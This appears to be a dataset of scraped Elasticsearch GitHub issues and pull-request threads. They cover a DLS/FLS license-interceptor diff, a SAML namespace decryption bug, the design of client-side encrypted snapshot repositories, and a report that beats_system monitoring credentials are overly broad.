diff --git a/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/interceptor/DlsFlsLicenseRequestInterceptor.java b/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/interceptor/DlsFlsLicenseRequestInterceptor.java
index 7fcf855d608..47c6eb81fdc 100644
--- a/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/interceptor/DlsFlsLicenseRequestInterceptor.java
+++ b/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/interceptor/DlsFlsLicenseRequestInterceptor.java
@@ -56,46 +56,52 @@ public class DlsFlsLicenseRequestInterceptor implements RequestInterceptor {
                 final IndicesAccessControl indicesAccessControl = threadContext.getTransient(INDICES_PERMISSIONS_KEY);
                 if (indicesAccessControl != null) {
                     final XPackLicenseState frozenLicenseState = licenseState.copyCurrentLicenseState();
-                    final IndicesAccessControl.DlsFlsUsage dlsFlsUsage = indicesAccessControl.getFieldAndDocumentLevelSecurityUsage();
-                    boolean incompatibleLicense = false;
-                    if (dlsFlsUsage.hasFieldLevelSecurity()) {
-                        logger.debug(
-                            () -> format(
-                                ""User [%s] has field level security on [%s]"",
-                                requestInfo.getAuthentication(),
-                                indicesAccessControl.getIndicesWithFieldLevelSecurity()
-                            )
-                        );
-                        if (false == FIELD_LEVEL_SECURITY_FEATURE.check(frozenLicenseState)) {
-                            incompatibleLicense = true;
+                    if (logger.isDebugEnabled()) {
+                        IndicesAccessControl.DlsFlsUsage dlsFlsUsage = indicesAccessControl.getFieldAndDocumentLevelSecurityUsage();
+                        if (dlsFlsUsage.hasFieldLevelSecurity()) {
+                            logger.debug(
+                                () -> format(
+                                    ""User [%s] has field level security on [%s]"",
+                                    requestInfo.getAuthentication(),
+                                    indicesAccessControl.getIndicesWithFieldLevelSecurity()
+                                )
+                            );
+                        }
+                        if (dlsFlsUsage.hasDocumentLevelSecurity()) {
+                            logger.debug(
+                                () -> format(
+                                    ""User [%s] has document level security on [%s]"",
+                                    requestInfo.getAuthentication(),
+                                    indicesAccessControl.getIndicesWithDocumentLevelSecurity()
+                                )
+                            );
                         }
                     }
-                    if (dlsFlsUsage.hasDocumentLevelSecurity()) {
-                        logger.debug(
-                            () -> format(
-                                ""User [%s] has document level security on [%s]"",
-                                requestInfo.getAuthentication(),
-                                indicesAccessControl.getIndicesWithDocumentLevelSecurity()
-                            )
-                        );
-                        if (false == DOCUMENT_LEVEL_SECURITY_FEATURE.check(frozenLicenseState)) {
+                    if (false == DOCUMENT_LEVEL_SECURITY_FEATURE.check(frozenLicenseState) ||
+                        false == FIELD_LEVEL_SECURITY_FEATURE.check(frozenLicenseState)) {
+                        boolean incompatibleLicense = false;
+                        IndicesAccessControl.DlsFlsUsage dlsFlsUsage = indicesAccessControl.getFieldAndDocumentLevelSecurityUsage();
+                        if (false == DOCUMENT_LEVEL_SECURITY_FEATURE.check(frozenLicenseState) &&
+                            dlsFlsUsage.hasDocumentLevelSecurity()) {
+                            incompatibleLicense = true;
+                        } else if (false == FIELD_LEVEL_SECURITY_FEATURE.check(frozenLicenseState) &&
+                            dlsFlsUsage.hasFieldLevelSecurity()) {
                             incompatibleLicense = true;
                         }
-                    }
-                    if (incompatibleLicense) {
-                        final ElasticsearchSecurityException licenseException = LicenseUtils.newComplianceException(
-                            ""field and document level security""
-                        );
-                        licenseException.addMetadata(
-                            ""es.indices_with_dls_or_fls"",
-                            indicesAccessControl.getIndicesWithFieldOrDocumentLevelSecurity()
-                        );
-                        listener.onFailure(licenseException);
-                        return;
+                        if (incompatibleLicense) {
+                            final ElasticsearchSecurityException licenseException = LicenseUtils.newComplianceException(
+                                ""field and document level security""
+                            );
+                            licenseException.addMetadata(
+                                ""es.indices_with_dls_or_fls"",
+                                indicesAccessControl.getIndicesWithFieldOrDocumentLevelSecurity()
+                            );
+                            listener.onFailure(licenseException);
+                            return;
+                        }
                     }
                 }
             }
-
         }
         listener.onResponse(null);
     }
diff --git a/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/interceptor/SearchRequestInterceptor.java b/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/interceptor/SearchRequestInterceptor.java
index 8e8f2bd6c77..f50c4bb5777 100644
--- a/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/interceptor/SearchRequestInterceptor.java
+++ b/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/interceptor/SearchRequestInterceptor.java
@@ -74,7 +74,8 @@ public class SearchRequestInterceptor extends FieldAndDocumentLevelSecurityReque

     @Override
     public boolean supports(IndicesRequest request) {
-        return request instanceof SearchRequest;
+        return request instanceof SearchRequest && ((SearchRequest) request).source() != null &&
+            (((SearchRequest) request).source().suggest() != null || ((SearchRequest) request).source().profile());
     }

     // package private for test
```> Also, for my own education... part of this data structure the (now) lazy work contributes (org.elasticsearch.xpack.core.security.authz.accesscontrol.IndicesAccessControl.IndexAccessControl) determines access per index is granted or not ... do you know exactly how the granted information is used ? It appears to be tracked but I can't see how granted it is actually used (or how it could ever be false) as the requested index names have been replaced on the request object.

I think it's possible to remove the granted flag on the access control. It is used in a few places (ie authz child actions, and authz bulk items) but I think we can find ways to not require it in those cases as well.The `DlsFlsLicenseRequestInterceptor` does two things:
1. Prevent API keys with DLS/FLS from being used if license is not compatible (https://github.com/elastic/elasticsearch/pull/78378)
2. Feature usage tracking for DLS and FLS (https://github.com/elastic/elasticsearch/pull/79152)

The [diff](https://github.com/elastic/elasticsearch/pull/88708#issuecomment-1219327330) that @albertzaharovits proposed should work for 1. But it seems to need further tweaking for 2. The usage tracking requires:
1. Separate tracking for DLS and FLS
2. Track usage when license is compatible, e.g. Cloud deployments always have compatible licenses and we need track actual feature usages.
3. Track usage only when the feature is actually used. 

(Item 2 and 3 were the reason why existing code checks indicesAccessControl before license)

The interceptor was chosen to be the place for usage tracking because it is a choking point for all requests. So checking in the interceptor avoids having to check it in multiple places and is more future proof. But it probably makes authZ optimisation harder. In that case, we might have to think of different ways of handling usage tracking. I don't have strong opinions. Sorry to add more requirements to this issue. @ywangd Good point about feature usage tracking when license is compatible and the feature is actually used.
I would argue that the DLS/FLS feature is not actually used on the coordinating node.
In order to have some leeway in defering the access control map computation, would it be reasonable to track the DLS/FLS feature usage on the data nodes, ie inside the `SecurityIndexReaderWrapper`?",yes,">non-issue,:Security/Authorization,Team:Security,v8.6.0,"
elastic/elasticsearch,1140122621,"SAML Assertion decryption fails when the assertion namespace is declared on the Response element","### Elasticsearch Version

> 7.1

Elasticsearch fails to decrypt an encrypted SAML Assertion when it is missing the `Assertion` namespace declaration. 

It's not the decryption itself that fails but rather that we fail to parse the XML document after decrypting it. 

### Background 

- XML has [namespaces](https://en.wikipedia.org/wiki/XML_namespace). For instance SAML messages often start with 
   ```
   <samlp:Response xmlns:samlp=""urn:oasis:names:tc:SAML:2.0:protocol""> 
   ``` 
   where `samlp:Response` tells us that this is an element under the `samlp` namespace and then the `xmlns:saml=""urn:oasis:names:tc:SAML:2.0:assertion""` part tells us that `samlp` namespace is defined as ""urn:oasis:names:tc:SAML:2.0:assertion"". We can then look up this URI ( `""urn:oasis:names:tc:SAML:2.0:assertion""` ) and figure out what this `Response` element is and how we can validate it's syntactic correctness. 

- When you have XML like 
   ```
   <a>
        <b>
        </b>
   </a>
   ```
   
   you can either put all the namespace declarations on the root ( `<a>` in this case ) , or put each declaration where it is used, so some in `<a>` that are used by `<a>` and some by `<b>` that are used by `<b>`. The important thing is that the piece of software that needs to do the validation of the XML syntax, needs to know all , one way or another. 

See: https://www.w3.org/TR/1999/REC-xml-names-19990114/#ns-decl for more details. 

      
### Elasticsearch's behavior when decrypting SAML messages

1. Elasticsearch gets a SAML message as a base64 string and decodes it. 
2. Elasticsearch then has an XML message that looks like
    ```
    <Response>
        <EncryptedAssertion>
        </EncryptedAssertion>
    </Response>    
    ```
3. We **detach** this Encrypted Assertion and attempt to decrypt it on its own. 
4. After we decrypt the `EncryptedAssertion` into an Assertion, we parse it and validate it syntactically before we use it. This happens automatically by virtue of `org.opensaml.xmlsec.encryption.support.Decrypter#parseInputStream` being called. 


### The manifestation of the issue

- Certain IDP implementations add namespace declarations _only_ on the root. For instance, a SAML Response can look like
   ```
   <?xml version=""1.0""?>
   <samlp:Response xmlns:samlp=""urn:oasis:names:tc:SAML:2.0:protocol"" xmlns:saml=""urn:oasis:names:tc:SAML:2.0:assertion"" Version=""2.0"" ID=""_e1ef86d712147fb585a3eb22c50a30270f080d2074"" InResponseTo=""_b5e9bfef6f2007d4571322283fff12bbf3d90abb"" IssueInstant=""2022-01-25T15:48:04Z"" Destination=""THESPACSHERE"">
   ///// MORE SAML HERE - REMOVED FOR CLARITY 
      <saml:Assertion Version=""2.0"" ID=""_929460c61aa2d7c1c2492c45c79da98a7cc004188a"" IssueInstant=""2022-01-25T15:48:04Z"">
      </saml:Assertion>
   </samlp:Response>
   ```
   
   The enclosed element is an `<saml:Assertion>` one but the `saml` namespace is defined in the root of the XML Document (`xmlns:saml=""urn:oasis:names:tc:SAML:2.0:assertion"" `)
   The IDP then encrypts this and sends it over as 

   ```
   <?xml version=""1.0""?>
   <samlp:Response xmlns:samlp=""urn:oasis:names:tc:SAML:2.0:protocol"" xmlns:saml=""urn:oasis:names:tc:SAML:2.0:assertion"" Version=""2.0"" ID=""_e1ef86d712147fb585a3eb22c50a30270f080d2074"" InResponseTo=""_b5e9bfef6f2007d4571322283fff12bbf3d90abb"" IssueInstant=""2022-01-25T15:48:04Z"" Destination=""THESPACSHERE"">
   ///// MORE SAML HERE - REMOVED FOR CLARITY 
      <saml:EncryptedAssertion>
      </saml:EncryptedAssertion>
   </samlp:Response>
   ```
   
   Again, the namespace for `<saml:EncryptedAssertion>`, which is `saml:` , is defined only in the Response element.

- When, during step 3 above, we decrypt that SAML message, we decrypt the Assertion element on its own and get : 
   ```
   <?xml version=""1.0""?>
      <saml:Assertion Version=""2.0"" ID=""_929460c61aa2d7c1c2492c45c79da98a7cc004188a"" IssueInstant=""2022-01-25T15:48:04Z"">
      </saml:Assertion>
   ```
   
 - During step 4 above, we (well, opensaml) try to parse and validate this and we _fail_ ! We fail, because we see `<saml:Assertion>` on this element, but we have no idea about the `saml` namespace, as it is not defined inline. Example of an error: 
 
   ```
   Caused by: org.xml.sax.SAXParseException: Le préfixe ""saml"" de l'élément ""saml:Assertion"" n'est pas lié.
   ```
   
   Under normal logging configuration this is partially masked and reported only as a Decryption error, apart from a single
   ```
   [2022-01-25T16:48:07,058][ERROR][n.s.u.j.s.x.BasicParserPool] [node1] XML Parsing Error
   ```
   message. Additional insights, which point to the exact issue at hand can be gained by setting 
   ```
   logger.samlxml_decrypt.name = org.opensaml.xmlsec.encryption.support.Decrypter
   logger.samlxml_decrypt.level = debug
   logger.saml2_decrypt.name = org.opensaml.saml.saml2.encryption.Decrypter
   logger.saml2_decrypt.level = debug
   logger.saml2_basicparser.name = net.shibboleth.utilities.java.support.xml
   logger.saml2_basicparser.level = debug
   ```
   

We should be able to consume such SAML Responses, AFAICT these are valid and there are a number of SP implementations that can handle them correctly. 
","Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,441381154,"Client Side Encrypted Snapshot Repositories","This concerns the encryption of snapshot data before it leaves the nodes.

We have 3 types of cloud snapshot repository types: Google Cloud Storage, Azure Storage and Amazon S3. [Amazon](https://aws.amazon.com/articles/client-side-data-encryption-with-the-aws-sdk-for-java-and-amazon-s3/) and [Azure](https://docs.microsoft.com/en-us/azure/storage/common/storage-client-side-encryption-java) support client side encryption for their java clients, but [Google](https://cloud.google.com/storage/docs/encryption/client-side-keys) does **not**.

Amazon and Azure, which support client side encryption, allow the keys to be managed by the client (us) or by their _Key Management Service_ (Vault-like). They both use the [Envelope Encryption](https://cloud.google.com/kms/docs/envelope-encryption) method; each blob is individually AES-256 encrypted with a randomly generated (locally) key, and this key (Data/Content Encryption Key) is also encrypted with another _Master Key_ (locally or by the _Vault_ service) and then stored alongside the blob in its metadata. The envelope encryption facilitates _Master Key_ rotation because only the small _(D/C)EK_ key has to be re-encrypted, rather than the complete blob.

On the ES side we discussed on having a _single fixed URN key handler_ at the repository settings level.
This URN identifies the _Master Key_; for example this could point to a key on the Amazon Vault Service or the Keys on each node's keystore. In this alternative it is not possible to rotate the keys via the repository API (it might be possible to do it outside ES, which is obviously preferable, but see below).

I believe this is the rough picture of the puzzle that we need to put together.

We oscillated between implementation alternatives, and I will lay out the one which I think is favorable. Whatever solution we initially implement, given that the _Master Key_ identifier is an URN we can multiplex multiple implementations for the same repository type.

We mirror the _Envelope Encryption_ algorithm, employed by Amazon and Azure, at the `BlobContainer` level. The key is stored on each node's keystore (and is pointed to by the repository level URN reference).

Advantages:
* Implement once for all cloud repository types and it will even work for the file system repository type!
* Testing! We can have unit tests for the base implementation of the ~`EncryptedBlobContainer` and end-to-end integration tests in only one of the implementation (Amazon or FS), where we can decrypt the data on the service fixture.

Disadvantages:
* Duplicates code in one SDK
* We're in the open with Key Rotation. We might need to implement our own cmd line tool to rotate keys (download objects metadata, decrypt the key and re-encrypt it). Tool will be ""easy"" to implement.
* Does not support _Vault_ keys.

In the opposite corner, there could be this alternative:
We use the AWS cloud library facility to implement it only for the S3 repository type. The key is stored either on the node's keystore or on the AWS Key Management Service.

Advantages:
* Easiest to implement
* Supports AWS's Vault Service
* We _might_ have support for key rotation, using amazon's [command line tool](https://aws.amazon.com/blogs/security/how-to-encrypt-and-decrypt-your-data-with-the-aws-encryption-cli/)

Disadvantages:
* Only S3 repository type is supported
* Testing. We either mock the client and check that the code indeed calls the ""crypto"" APIs or we do an end-to-end integration test, where we decrypt the data on the fixture. Either way we kinda ""test the library"" rather than our code. This is pointless and brittle, but we need testing because the risks are too great.

Relates https://github.com/elastic/elasticsearch/issues/34454 https://github.com/elastic/elasticsearch/pull/40416

----

**EDITED 28.01.2021 Backlog:**

* [ ] Add the new API that changes the password for a given encrypted repository.
The encrypted repository must already be configured with the correct password. The API iterates over all the associated
wrapped DEKs (contained inside a dedicated blob container under the repository's base path), and proceeds to unwrap and re-wrap all the DEKs with the new password.
Finally, the old DEKs are removed, so that the old password cannot be used any longer.
* [ ] implement searchable and encrypted repositories.
This mainly requires implementing the AbstractBlobContainer#readBlob interface. This is slightly problematic because the association id between an encrypted blob and its DEK is prepended at the beginning of the blob, so that decryption at an internal position currently requires a seek at the beginning. Double check that the definition structure is reasonable (ie. is it searchable and encrypted or vice-versa, ping David about this).
* [ ] ensure compressed & encrypted repositories work
* [ ] investigate metered and encrypted repositories
* [ ] thoroughly test failure scenarios where IOExceptions are thrown. Generally speaking, (although nor really true in practice) reads and writes contain
two operations that can fail independently. Make sure testing covers this.
* [ ] create benchmarks (distributed team is working on something that measures the throughput of a repository)
* [ ] permit (and test) encrypted HDFS repositories (it should work)
* [ ] double check that AbstractBlobContainer#blobExists and EncryptedBlobContainer#listBlobs/listBlobsByPrefix for EncryptedBlobContainer can return `true` and then reading to fail because of decryption problems
* [ ] double check that we're not relying on system encoding (that strings are always written UTF-8 encoded, and reads are always decoded with the same UTF-8)
* [ ] ensure that there's no problem that EncryptedBlobContainer#writeBlobAtomic is not atomic (in general, it cann't be because a write might also generate and write the DEK, so there are two operations that can fail independently)
* [ ] ensure that it's alright for EncryptedBlobContainer#listBlobs/listBlobsByPrefix to return the encrypted blob size (which is larger), instead of the expected blob size of the decrypted blob
* [ ] think about possibly renaming ""password name"" to ""password label""
* [ ] investigate repository password situation on cloud.
On-premise repository passwords are cached in memory when the node starts, usually requiring a node restart when configuring a new snapshot repository. The security settings implementation on cloud is different, so that maybe we can read the repository passwords immediately after they've been added, changed, without requiring a restart.
* [ ] repository password min-length limit (an encrypted repository with a short password )
* [ ] make KDF parameters configurable
* [ ] investigate the naming of the delegating and delegated repositories (they are the same currently, is this a problem?)
* [ ] make crypto provider selectable for operations on the client side-encrypted repo
* [ ] test that encrypted repos can share the bucker (but different base path, otherwise we already test that the passwords must be the same) and can also share the repository client
* [ ] Revisit definition of password name in repository settings (see: https://github.com/elastic/elasticsearch/pull/53352#discussion_r409314119 )
* [ ] Settle on the specification for encrypted and searchable snapshots (ping David about it)
* [ ] Investigate if versioning if individual encrypted blobs is necessary https://github.com/elastic/elasticsearch/pull/53352/files#r444383568
* [ ] Investigate if we can guarantee that DEKs do not change inside a given shard
* [ ] Report encryption stats (from https://github.com/elastic/elasticsearch/pull/53352#discussion_r432261031)
* [ ] test FIPS negative behaviour (that a short password doesn't crash the node or something).","Pinging @elastic/es-securityPinging @elastic/es-distributedWe discussed this today, in our weekly team meeting, but got into extra time pondering the alternatives. 

Yet we settled that we don't need to support moving snapshots between repositories.

I would like to kindly ask the distributed team for any input.
In addition, I plan to do the work, but I would need one review volunteer from the distributed team.@albertzaharovits 

what do you mean by 

> Duplicates code in one SDK

It seems to me for the first option we could ""simply"" pass a secure setting for the current encryption key to `org.elasticsearch.repositories.blobstore.BlobStoreRepository` and then wrap all the write and read operations that are initiated from there with the crypto logic completely agnostic to the underlying implementation of the blob store?

That said, I like the first option much better than doing some SDK specific thing just for S3. In the end it seems like that is probably less effort maintenance-wise long term since relying on the SDK's implementations of this completely puts us at the mercy of whatever changes happen with that. Plus, as you point out, working with the SDKs only will be tricky to test and not cover the FS repository.

I would point out one thing though (sorry if this was already discussed, just ignore this if it was :)):

The snapshot mechanism uses blob names as part of it's logic somewhat extensively. Even if we client side encrypt every blob, we'd still be leaking the following information:
* Number of snapshots in the repository
* Number of indices in all snapshots
* Number of shards in each index
* Number of snapshots (and anonymous id of each of them) that each shard is part of (and vice versa, number of indices and shards in each snapshot)
* Roughly the number of segments in each shard in some cases

Not sure if that's a compliance problem, but that would certainly be something that would be challenging to not leak via the blob names.

That's all I have for now. Happy to help review you work though :)@original-brownbear 
Thank you very much for the prompt response!

> It seems to me for the first option we could ""simply"" pass a secure setting for the current encryption key to org.elasticsearch.repositories.blobstore.BlobStoreRepository and then wrap all the write and read operations that are initiated from there with the crypto logic completely agnostic to the underlying implementation of the blob store?

Yes, that's the first option I was trying to describe. What I mean when I say we duplicate code, is that the ""crypto logic"" (the envelope encryption, AES algorithm, all that) will most likely be very similar (on purpose) to what the SDK already does.

> Not sure if that's a compliance problem, but that would certainly be something that would be challenging to not leak via the blob names.

I think that's a very thoughtful observation, and that it should definitely get in the docs. I don't believe there are regulations for that, and we are not aiming for a specific compliance target, but I'm no expert either. Maybe @joshbressers is more knowledgeable in this regard? I propose we clearly acknowledge this limitation in the docs and act on it only if we get specific requests.

> That said, I like the first option much better than doing some SDK specific thing just for S3.
> Happy to help review you work though

Glad to hear! Thank you!

Ideally we don't want to leak any metadata, but I know sometimes it's unavoidable.

We probably won't run afoul of any compliance standards here. We could see some interest from certain sensitive customers, but generally their concern revolves around leaking names more than this sort of metadata.Thank you for the answer @joshbressers ! I merely wish to reinforce this position by highlighting that leaking this type of metadata tips off _cluster configuration_ but _no information on the actual data_.I think it would be preferable to implement this ourselves and not rely on the blob-store libraries to do it.

Ultimately, we need this for multiple repository types, and we _could_ use the cloud SDKs for it, but we would still need to build & verify it for each provider, which wouldn't gain us very much over just building it ourselves.
 
Here is the 10 thousand feet view of the currently favored approach.

We create a new type of blob store repository, the `encrypted` type, that wraps and delegates read/write blob operations to an internally contained blob store repository. In essence, when the administrator creates an encrypted repository the ""delegated"" type must be specified (which is one of the blob store repository types already available `fs`, `azure`, `s3`, `gcs`, ?others?) and the creation will instantiate a private internal repository of that type. It will then use this internal repository's read/write-blob operations to store the same data, but encrypted.

Encryption uses the ""envelope"" strategy. This means that there is a data encryption key (DEK) and a key encryption key (KEK). The DEK is generated randomly for each ""blob"", and it encrypts the blob (the actual data). The KEK is a secret parameter of the ""encrypted"" repository, and it encrypts every DEK. In this case, the encrypted repository is comprised of ""blobs"" encrypted with DEKs, and of DEKs encrypted with the KEK. The KEK is not stored publicly.

The encryption algorithm for the DEK encrypting blobs is AES in the GCM mode using a 256 bit key length. For the DEK encryption with the KEK the same AES algorithm is used but with the ECB mode (this is intrinsic in the `AESWrap` Cipher from `SunJCE`). The GCM mode offers authenticated encryption which prevents attacks in which cipher text manipulations trigger predictable alterations of the decoded text. The plan is to use the BouncyCastle crypto provider (?the FIPS variant?) because the default SunJCE is very weak wrt to performance during decryption. The SunJCE provider will not release the decrypted text until the authentication tag has been verified, and hence it recurs to expensive in-memory buffering. It should be noted that it is not possible to have the code truly independent of the Crypto provider because the Cipher initialization is unfortunately (slightly) different for the implementations in the SunJCE and BC providers.

One un-encrypted blob ""generates"" one encrypted blob, and another blob containing the encrypted DEK. Ideally we should have a **versioned** format for an ""encryption metadata"" blob which contains the encrypted DEK and other description type of data, such as the IV. The metadata blob should be **hashed** but plain , aside from the encrypted DEK. The plan is to use the `authenticated data` of the GCM mode to include the metadata blob in the authentication tag computation. It should be noted that the write/read operation for blobs is no longer atomic (because it is translated into two such operations). The code aims to make sure that a blob cannot result without its associated metadata (by writing the metadata first, and deleting the blob first, etc).

We have a plethora of KEK storage/generation. The code in the current POC generates it from a text password from the keystore. Other alternatives include to store the binary key in the keystore or a separate file, or source it via KMIP, Amazon KMP, or delegate the ""key unwrap"" operation via KMIP . We don't have to limit it to a single method but we need to decide what the method is for the first iteration (CC @bytebilly).

Key rotation happens via an ES API . Key rotation implies the use of the old KEK to decrypt all the DEKs and re-encrypt them with the new KEK. Key rotation is depended upon the way we store the KEK. With the current approach of storing a text password in the keystore, the keystore reload call can also rotate keys. But it might not be desirable to hog the reload API call for the reload operation. Another approach is defer the rotation until the next snapshot (which could be an empty one) rather than creating a new API for it. In any case, because of the failure situations we would have juggle both the old and the new KEKs inside the keystore at least for some time, but the precise flow is yet TBD.

Here is the POC were I've explored these choices https://github.com/elastic/elasticsearch/pull/46170 .Here is what it still needs to be done/investigated, the order is somehow important:

- NIST SP800-38D investigate any faux-pas (for example to not interpret deciphered data; we should be assured that a throw on a stream close, when the authentication tag is verified, will abort the full operation and remove the faulting blob, see`FileRestoreContext`)
- add the FIPS BC provider and check that it all works nicely in a FIPS JVM
- decide on a way to store the KEK for the minimum viable product (Is a text password in the ES KeyStore, optionally ""consistent"" across nodes, sufficient?)
- pin down the protocol to rotate keys. I think the invariable we should maintain is to not have two different snapshots in the same repository using different KEKs.
- make the encryption metadata blob versioned and HMACed (investigate using the authenticated data of the GCM mode; it might require another key)
- test that the authenticated encryption works, and that whatever exception pops up will abort the restore operation correctly (there were glaring errors in the JDK in the past).
- investigate the AES 256 against our JDK compatibility matrix (does the oldest JDK 8 we support require the export trick to work?)

We discussed the list above and prioritized some items as follows, so as to be sure we resolve all unknowns as soon as possible:

- move the repository plugin from #46170 under the x-pack folder and license
- investigate the FIPS BC provider in a FIPS JVM. Can we make the plugin work in FIPS mode?
- test the plugin against a cloud repository (eg `S3`), only the `fs` type has been tested so far
- decide on the format of the KEK for the first iteration

This last point requires input from the product team @bytebilly .
As developers we think that a textual password inside the elasticsearch keystore on every node for which we can check consistency across nodes ought to be sufficient. The password is used to generate the master AES KEK using a well known algorithm (`PBKDF2WithHmacSHA256`) . In the long run we believe it's almost certain that we will need to integrate with key management services like Vault (via its newly added KMIP protocol) or Amazon's or Google's particular Key Management Services (KMS). Therefore, later in the development of this first iteration we will think about how this would precisely work, but first we need to agree that a textual password in the keystore is a good candidate that the cloud and potential clients asking for client-side encryption would use (they might have other preferences, but at least this option does not scare every potential client). The decision for how we store/generate the KEK has a big implication on how the key rotation works as well, and it is the biggest moot point of this feature.@albertzaharovits I totally agree with the client-side management of encryption keys.
This solves two problems:
1. support the encrypted flow for generic storages (not just for some predefined cloud providers)
1. comply with security requirements where customers need to provide encryption keys on request

We can consider using a password to seed the KEK, and store it in the node keystore. This is a viable first iteration, and I don't see blockers in current enhancement requests to suggest something different. Further support for cloud-specific key management systems could be added in a second step.

Storing the binary KEK in the keystore is not very useful in my opinion, since it doesn't increase security (KEK can be directly used to decrypt DEK, so it's not a safer option). The text password is easier to use in command line tools we can eventually provide to manually manage encrypted snapshots.

A possible flow could have a flexible configuration that defines the password source. It can define if the password is in the keystore, or if it should be retrieved from an external source. The first part is what we can ship first.

Password rotation could occur automatically every new snapshot, and in addition we can provide a specific API for that. I expect customers may need to guarantee rotation within a well-defined range for regulations. I'd rather avoid coupling rotation with keystore reload.

With this approach, we provide an out-of-the-box key rotation for everyone (every new snapshot), but we also allow rotation on-demand for customers with specific needs. 
In the future, it would be awesome to support cloud-based keys to be rotated transparently with the same API, making the entire flow decoupled from the underlying implementation.

What I'm still missing, is who defines this password. Is it user defined, or automatically generated by the system? In the first case, how do we deal with key rotation, since it would replace the user-defined value?
Another point that I still don't have clear is if we need to define the password in each node, and if they should be the same.Thanks for looking into it @bytebilly !

> We can consider using a password to seed the KEK, and store it in the node keystore. This is a viable first iteration, and I don't see blockers in current enhancement requests to suggest something different.

Good to hear that.

> A possible flow could have a flexible configuration that defines the password source. It can define if the password is in the keystore, or if it should be retrieved from an external source.

As far as ""passwords"" are concerned I think they should reside in the keystore **only**. Subsequent iterations on this feature could ""source"" the secret to seed the KEK from external systems, but in this case I think it makes more sense to get the actual KEK, and not do any alterations to that.

> Password rotation could occur automatically every new snapshot, and in addition we can provide a specific API for that. I expect customers may need to guarantee rotation within a well-defined range for regulations. I'd rather avoid coupling rotation with keystore reload.

Note that the current design aims for a single KEK **per repository** not per snapshot. Adding a new API to perform the rotation is better compared with coupling this operation with the keystore reload. If the _old_ and the _new_ KEKs during rotation are self-descriptive (meaning the rotation API can tell which one supersedes the other, eg last modified date for keystore entries) then it is possible to do without a new API and trigger the rotation of the whole repository on the next snapshot (which could be empty). But I'm getting ahead of myself, I'll plan for the API not for self-descriptive keys, where you explicitly name in the API the _old_ and the _new_ keys (assumes all keys are ""nameable"").

> In the future, it would be awesome to support cloud-based keys to be rotated transparently with the same API, making the entire flow decoupled from the underlying implementation.

If keys are nameable it should work with the API that's to be introduced in the first iteration. Names will look like URIs, I think this is how they are referred to by all cloud providers.

> What I'm still missing, is who defines this password. Is it user defined, or automatically generated by the system?

User defined. I'm open to suggestion to have it seeded by a random value in the keystore, although it doesn't sound too useful to me, but if it enhances UX I am open to it, but it's not consequential at this stage.

> In the first case, how do we deal with key rotation, since it would replace the user-defined value?

Yeah, both values should be available in the keystore simultaneously. They should have ""similar"" names (under the same namespace).

> Another point that I still don't have clear is if we need to define the password in each node, and if they should be the same.

Yes, on every node. We have infrastructure to be assured that they are all equal on all nodes (not used as of right now, but the infra is there).
In https://github.com/elastic/elasticsearch/pull/53352 I've raised a PR with an implementation of the encrypted `BlobStoreRepository` which follows the ""DEK reuse"" strategy discussed over at https://github.com/elastic/elasticsearch/pull/50846#issuecomment-594063727 . I would like to try and explain the whole of functionality, as it currently stands.

Encrypted snapshots are implemented as a new repository type, under a module of the x-pack plugin. Encrypted snapshots are available for the following existing repository types: S3, Azure, GCS and FS. An encrypted snapshot encrypts all the data that is part of the snapshot before it is uploaded to the storage service. Snapshots are encrypted when an ordinary snapshot operation is performed against a repository of the new encrypted type. It is not possible to encrypt the snapshots in an existing regular repository.

An encrypted repository is created similarly to creating the regular repository of the same type (eg S3). The same APIs are used, but, in addition, creating encrypted repositories require a new repository setting (cluster state) which names the secure setting holding the repository password which is used to derive the encryption keys (See the example at https://github.com/elastic/elasticsearch/pull/53352#issue-386282488 for how to create an encrypted FS repository).
The repository password must be stored in the keystore on every master and data node. A wrong or missing password on one of the data nodes will prevent snapshoting (and restoring) shards on that node.

More technically, encrypted snapshots work by encrypting (AES-256) all data at the blob level, that's uploaded to the storage service. The data encryption keys (DEK) are generated randomly by every node. A generated DEK is reused locally by the node at most for the lifetime of repository (until the repository is deleted or the node is shut down), but the exact details on when a DEK is reused is an implementation detail (it is deliberated starting at https://github.com/elastic/elasticsearch/pull/50846#issuecomment-592214430). The association of the encrypted blob to its DEK is realized by prefixing a DEK name to the encrypted blob. DEKs themselves are encrypted (AES Wrap) and stored under a location, which contains the DEK name, in the storage service as well. The key encryption keys (KEK), used to encrypt the DEKs, are generated starting from the repository password using the PBKDF2 algorithm. The association between the KEK and the DEKs it wraps is realized by storing the wrapped DEK under a path location that requires knowledge of the password (it's again an implementation detai). Theoretically, there could only be one KEK in existence ever (for the lifetime of the repository password), but it is combersome to ensure all the participants use the same KEK, so a relaxed approach has been adopted which derives the KEK by using the DEK name as a salt in the PBKDF2 function (because the DEK name is generated randomly for the purpose of uniqueness anyway).I've created the following two diagrams on how keys are generated and used internally:
[ES encrypted snapshots.pdf](https://github.com/elastic/elasticsearch/files/5890454/ES.encrypted.snapshots.pdf)


They are sketchy and not very professional, but they are accurate as the code currently stands, and, I hope, informative.
When everything is wrapped up, I plan to have something standardized (like ""UML for encryption protocols"") and vectorized.
@albertzaharovits hello. The idea with server side encryption is very cool. Can you tell if there are elasticsearch builds with the `""type"": ""encrypted""` repository?",no,">enhancement,:Distributed/Snapshot/Restore,:Security/Security,Team:Distributed,Team:Security,"
elastic/elasticsearch,396143191,"Security issues of using beats_system","I see a big security issue of using beats_system for monitoring beats shippers. It uses the same privilege (cluster:admin/xpack/monitoring/bulk) as logstash for its monitoring and probably allows the beats to send an arbitrary monitoring data. For components managed by Elastic administrator like Elasticsearch/Kibana/Logstash/beats on the es/kb/ls servers it if fine. But in larger deployments (like our) the beats are also managed by different departments/some 3rd party developers etc. If beats monitoring is being used in these deployments, it allows everyone who has access to some of monitored beats logshippers to break the whole monitoring because:
1. Each monitoring beats shipper contains credentials of user having beats_system (cluster:admin/xpack/monitoring/bulk) privilege
2. Everyone can use these credentials to put an arbitrary data to the Elasticsearch to destroy/fake monitoring data of any other component (beats shippers, logstash, elasticsearch monitored node ...)

